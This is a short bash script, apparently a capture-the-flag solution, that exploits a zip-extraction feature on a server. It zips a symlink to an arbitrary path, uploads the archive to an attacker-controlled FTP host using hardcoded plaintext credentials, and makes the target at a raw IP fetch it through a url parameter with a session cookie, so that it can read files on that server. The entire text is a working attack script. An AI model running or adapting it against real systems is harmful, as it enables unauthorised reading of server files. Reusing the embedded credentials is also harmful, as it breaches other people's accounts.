#!/bin/bash

## script is uploading single symlink on the servers

read pth
ln -sf $pth temp
rm "test.zip"
zip --symlinks "test.zip" temp
rm temp
curl -T "test.zip" ftp://mkwk018.cba.pl --user ctfish@ctfish.cba.pl:Haslo123
file=`curl 'http://35.198.175.71/?url=http%3A%2F%2Fctfish.cba.pl%2F'+'test.zip' -H 'Cookie: PHPSESSID=rgmisfpqe7n9a6gubun94vcspb' --compressed | grep -o 'files/[^"]*'`

echo 'http://35.198.175.71/'$file
